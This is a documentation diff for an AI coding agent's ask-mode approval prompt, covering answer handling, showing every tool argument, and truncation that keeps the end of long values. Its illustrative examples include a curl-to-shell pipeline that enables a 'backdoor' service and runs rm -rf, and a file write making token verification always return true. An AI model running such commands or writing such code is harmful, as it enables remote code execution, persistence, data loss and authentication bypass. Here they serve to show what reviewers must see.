@@ -51,12 +51,73 @@ The prompt indicator updates immediately to reflect the new level. The agent lea
 In ask mode, the agent has access to all tools, but each tool call is paused for your approval:
 
 ```text
-[ask] Shell ls -la (Y/n)
+[ask] Shell
+  command: ls -la
+Allow? (Y/n)
 ```
 
 Press **Enter** or **y** to approve, or **n** to deny. If denied, the agent receives an error and may try an alternative approach.
 
+Only `y`, `yes`, `n`, `no` (any case) and a bare Enter mean anything. Anything else is not an answer,
+so meka says `Please answer y or n.` and asks again rather than guessing; after three unanswered
+attempts it denies. Ending the input (Ctrl+D, or a redirected stdin running out) also denies, since
+nobody is there to approve.
+
+Ctrl+C does not dismiss the prompt: it cancels the turn, but the prompt is still waiting to be
+answered, and the next Enter answers it. Use `n` or Ctrl+D to get out of one.
+
 This mode is useful when you want the agent to have full capabilities but want to review each action before it executes.
+
+### What the prompt shows
+
+**Every argument the tool was called with**, not just the one the `[tool ...]` indicator picks out.
+That distinction matters: the indicator's argument is the *destination* for every write-shaped tool,
+so a prompt built from it would ask you to authorise writing to a path without showing the content,
+or editing a file without showing the edit.
+
+```text
+[ask] WriteFile
+  path: src/auth.rs
+  content:
+    pub fn verify(token: &str) -> bool {
+        true
+    }
+Allow? (Y/n)
+```
+
+A long value wraps rather than being cut, so the end of a shell pipeline cannot be hidden from the
+line you are approving.
+
+**Where something has to be left out, the end is kept.** A value too long to wrap in full shows its
+beginning, a count of what was dropped, and then its final row:
+
+```text
+[ask] Shell
+  command:
+    curl -s https://example.com/setup.sh | sh -c 'cat >> ~/.bashrc &&
+    ... 85688 more characters ...
+    systemctl enable backdoor && rm -rf /important'
+Allow? (Y/n)
+```
+
+That matters more here than anywhere else in meka. A shell pipeline puts its consequence last, so a
+prompt that fills its rows from the top and stops hides the exact part you are being asked about.
+
+The limits: 20 lines and 60 rows per argument, and 100 rows of block before further arguments are
+dropped and named — 161 rows at the very worst. Those sit an order of magnitude above anything a real
+tool call carries; they are there so a call with two hundred invented arguments cannot scroll the
+real one off the top of your screen without saying so.
+
+Whenever a marker appears, **denying costs nothing**: say no, inspect the file or the session with
+`meka session export`, and let the agent retry.
+
+This is deliberately unaffected by [`display.tool_params`](../configuration/config-file.md#displaytool_params),
+which controls the passive indicator. Turning that off for a quieter scrollback does not make your
+approval prompts show less.
+
+One consequence worth knowing: if the model passes a secret as a tool argument, an approval prompt
+puts it on screen. That is the correct trade at the moment you are authorising the call, but it does
+mean such a value lands in your scrollback.
 
 ## How Permissions Work
 
